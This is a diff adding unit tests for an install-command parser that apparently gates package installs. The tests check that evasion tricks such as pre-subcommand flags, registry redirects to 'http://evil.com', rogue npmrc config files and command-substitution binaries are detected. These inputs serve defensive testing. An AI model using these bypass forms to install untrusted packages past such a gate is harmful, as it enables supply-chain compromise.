@@ -332,6 +332,68 @@ describe("parseInstallCommand — sweep hardening (bypass closes)", () => {
     assert.ok(gated("echo evil | xargs npm i") && gated("PM=npm; $PM install evil"));
   });
 
+  it("CRITICAL: a manager flag BEFORE the subcommand no longer hides the install", () => {
+    // `npm -g install evil` shifted the verb past the fixed-index matchers → allowed.
+    assert.deepEqual(parseInstallCommand("npm -g install evil").refs, ["npm:evil"]);
+    assert.deepEqual(parseInstallCommand("npm --global i evil").refs, ["npm:evil"]);
+    assert.deepEqual(parseInstallCommand("sudo npm -g install evil").refs, ["npm:evil"]);
+    assert.deepEqual(parseInstallCommand("pnpm -g add evil").refs, ["npm:evil"]);
+    assert.deepEqual(parseInstallCommand("yarn --verbose add evil").refs, ["npm:evil"]);
+    assert.deepEqual(parseInstallCommand("pip -q install evil").refs, ["pip:evil"]);
+    assert.deepEqual(parseInstallCommand("pip --disable-pip-version-check install evil").refs, [
+      "pip:evil",
+    ]);
+    assert.deepEqual(parseInstallCommand("uv --quiet add evil").refs, ["pip:evil"]);
+    assert.deepEqual(parseInstallCommand("python -m pip -q install evil").refs, ["pip:evil"]);
+    // structural `python -m pip` still works after flag-compaction
+    assert.deepEqual(parseInstallCommand("python -m pip install pandas").refs, ["pip:pandas"]);
+  });
+
+  it("a flag-form registry redirect (equals form) is caught + userconfig/globalconfig", () => {
+    for (const cmd of [
+      "npm --registry=http://evil.com install express",
+      "npm i express --userconfig=./evil.npmrc",
+      "npm i express --globalconfig=/tmp/evil.npmrc",
+    ]) {
+      const p = parseInstallCommand(cmd);
+      assert.equal(p.isInstall, true, cmd);
+      assert.ok(
+        p.unverifiable.some((u) => u.startsWith("alt-registry:")),
+        cmd,
+      );
+    }
+  });
+
+  it("gates the -p/--package/--spec/--from package, not the run-command (runner)", () => {
+    assert.deepEqual(parseInstallCommand("npx --package=evil somecmd").refs, ["npm:evil"]);
+    assert.deepEqual(parseInstallCommand("npx -p evil somecmd").refs, ["npm:evil"]);
+    assert.deepEqual(parseInstallCommand("npm exec --package=evil -- somecmd").refs, ["npm:evil"]);
+    assert.deepEqual(parseInstallCommand("pnpm dlx --package evil somecmd").refs, ["npm:evil"]);
+    assert.deepEqual(parseInstallCommand("uvx --from=evil cmd").refs, ["pip:evil"]);
+    assert.deepEqual(parseInstallCommand("pipx run --spec=evil cmd").refs, ["pip:evil"]);
+    assert.deepEqual(parseInstallCommand("uv tool run --from evil cmd").refs, ["pip:evil"]);
+  });
+
+  it("covers pip wheel/download and poetry/pdm add (PyPI code execution)", () => {
+    assert.deepEqual(parseInstallCommand("pip wheel evil").refs, ["pip:evil"]);
+    assert.deepEqual(parseInstallCommand("pip download evil").refs, ["pip:evil"]);
+    assert.deepEqual(parseInstallCommand("poetry add evil").refs, ["pip:evil"]);
+    assert.deepEqual(parseInstallCommand("pdm add evil").refs, ["pip:evil"]);
+  });
+
+  it("fails closed on a command-substitution binary", () => {
+    for (const cmd of ["$(which npm) i evil", "`which npm` i evil"]) {
+      const p = parseInstallCommand(cmd);
+      assert.equal(p.isInstall, true, cmd);
+      assert.ok(
+        p.unverifiable.some((u) => u.startsWith("indirect-bin:")),
+        cmd,
+      );
+    }
+    // a var-PREFIXED real path is NOT dynamic → no false positive
+    assert.equal(gated("$HOME/bin/mytool run build"), false);
+  });
+
   it("does NOT over-trigger: comments, requirement files, and runner args", () => {
     // trailing comment stripped — only the real package is triaged, no bogus refs
     assert.deepEqual(parseInstallCommand("npm i react # installs react").refs, ["npm:react"]);
